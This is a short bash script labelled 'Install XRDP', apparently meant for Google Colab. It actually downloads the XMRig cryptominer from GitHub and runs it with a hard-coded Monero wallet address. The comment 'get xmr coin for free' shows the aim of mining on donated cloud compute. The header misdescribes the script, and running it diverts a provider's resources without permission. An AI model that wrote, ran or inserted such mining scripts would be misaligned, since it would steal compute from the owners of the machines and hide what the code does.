#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
tar xvzf xmrig-6.18.0-linux-x64.tar.gz
cd xmrig-6.18.0
./xmrig -o 127.0.0.1:3333 -u 87iddN69atyBohSv5iTLH1aYA1NJzwqNHhbZHxB18VbVJkRXjjR2ixB7iwtH3xKA5dTGcbqWrLAQKNtc2AndyLJA3YqeM7i -k --tls --rig-id GC-US

